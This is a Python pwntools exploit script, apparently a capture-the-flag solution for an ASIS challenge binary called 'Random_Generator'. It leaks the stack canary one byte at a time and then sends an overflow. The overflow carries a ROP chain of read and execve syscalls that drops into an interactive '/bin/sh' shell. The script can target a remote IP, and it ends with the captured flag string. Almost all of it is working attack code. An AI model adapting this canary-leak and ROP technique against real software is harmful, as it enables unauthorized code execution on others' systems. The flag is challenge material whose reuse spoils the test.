from pwn import *
from ctypes import *
#ROPgadget  --binary  Random_Generator  --badbytes '0a|09|0b|20|0d'
DEBUG = 1
if DEBUG:
     p = process('./Random_Generator')
     context.log_level = 'debug'
else:
     p = remote('69.90.132.40', 4000)

canary='\x00'
prdi_ret=0x0000000000400f63 #: pop rdi ; ret
prsi_pop_ret=0x0000000000400f61# : pop rsi ; pop r15 ; ret
bss_addr=0x6025a0# can't be 0x6020a0, because 0x20 will cut the payload down
prax_prdi_ret=0x0000000000400f8c#: pop rax ; pop rdi ; ret
syscall_ret=0x0000000000400f8f #: syscall ; ret
mrdx_rsi_ret=0x0000000000400f88 #: mov rdx, rsi ; ret
def get_canary():
    global canary
    for i in range(1,8):
        p.recvuntil('get?\n')
        p.send(str(i)+'\n')
        p.recvuntil('Your value = ')
        data=p.recvuntil('\nW')[:-2]
        data=int(data)
        canary+=chr(data)
        
def pwn():
    #gdb.attach(p,'b *0x400D73')
    get_canary()
    temp=u64(canary)
    print hex(temp)
    p.recvuntil('get?\n')
    p.send(str(10)+'\n')
    print p.recvuntil("comment: ")
    payload=p64(prax_prdi_ret)+p64(0)+p64(0)+p64(prsi_pop_ret)+p64(8)+p64(0)+p64(mrdx_rsi_ret)+p64(prsi_pop_ret)+p64(bss_addr)+'a'*8+p64(syscall_ret)+p64(prax_prdi_ret)+p64(59)+p64(bss_addr)+p64(prsi_pop_ret)+p64(0)+p64(0)+p64(mrdx_rsi_ret)+p64(syscall_ret)
    p.send('a'*(0x410-8)+canary+'a'*8+payload+'\n')
    p.send('/bin/sh\x00')
    p.interactive()

if __name__ == '__main__':
   pwn()

##ASIS{e77c4a76d8079b330e7e78e8e3f434c4}

 
    

